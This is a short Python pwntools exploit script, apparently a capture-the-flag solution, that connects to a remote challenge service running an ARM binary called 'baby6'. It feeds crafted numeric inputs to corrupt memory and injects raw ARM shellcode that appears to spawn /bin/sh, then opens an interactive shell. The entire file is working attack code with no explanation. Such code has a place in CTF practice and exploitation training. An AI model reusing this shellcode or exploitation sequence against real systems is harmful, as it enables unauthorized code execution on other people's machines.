from pwn import *

cnt=0
#p=process(['qemu-arm','-L','/usr/arm-linux-gnueabi','./baby6'])
#p=process(['qemu-arm','-g','1234','-L','/usr/arm-linux-gnueabi','./baby6'])
p=remote('baby-01.pwn.beer',10006)

sla = lambda x,y : p.sendlineafter(x,y)
go = lambda : p.interactive()

sla('number',str(1024)+'\x00'+'A'*0x400)
shell = str(0x112f8).ljust(8,'\x00')+'hp\x00\xe3AqD\xe3\x04p-\xe5/\x7f\x02\xe3/sG\xe3\x04p-\xe5/r\x06\xe3i~F\xe3\x04p-\xe5\r\x00\xa0\xe1sx\x06\xe3\x04p-\xe5\x0c\xc0,\xe0\x04\xc0-\xe5\x04\x10\xa0\xe3\r\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0-\xe5\r\x10\xa0\xe1\x02 "\xe0\x0bp\xa0\xe3\x00\x00\x00\xef'

for i in range(0xf):
    sla('number','1')

sla('number',str(0x41414141))
sla('number','1')
sla('number',shell)
sla('number','0')
p.recvuntil('total')
p.recvline()

p.interactive()
